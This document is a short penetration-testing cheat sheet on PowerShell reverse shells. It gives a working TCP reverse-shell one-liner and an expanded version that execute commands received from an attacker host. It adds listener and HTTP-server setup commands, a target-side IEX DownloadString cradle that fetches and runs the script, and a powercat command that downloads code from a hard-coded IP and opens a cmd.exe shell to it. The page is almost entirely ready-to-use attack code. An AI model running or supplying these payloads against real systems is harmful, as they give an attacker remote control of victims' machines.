# Powershell

{% hint style="info" %}
cmd.exe payload is more reliable and preferred.
{% endhint %}

## Powershell

### $ATTACKER

{% code title="rshell.ps1 \(one-liner\)" %}
```bash
$client = New-Object System.Net.Sockets.TCPClient("$ATTACKER",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
{% endcode %}

{% code title="rshell.ps1 \(expanded\)" %}
```bash
$client = New-Object System.Net.Sockets.TCPClient("$LHOST",443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
  $sendback = (iex $data 2>&1 | Out-String );
  $sendback2 = $sendback + "# ";
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush()};
$client.Close()
```
{% endcode %}

```bash
sudo python -m SimpleHTTPServer 80
sudo nc -nlvp 443
sudo ufw allow from $TARGET proto tcp to any port 80,443
```

### $TARGET

```bash
powershell IEX (New-Object Net.WebClient).DownloadString("http://$ATTACKER/rshell.ps1");
```

## Powercat

```bash
powershell  -nop -exec bypass -c "IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.119.189/powercat.ps1');powercat -c 192.168.119.189 -p 443 -e cmd.exe"
```
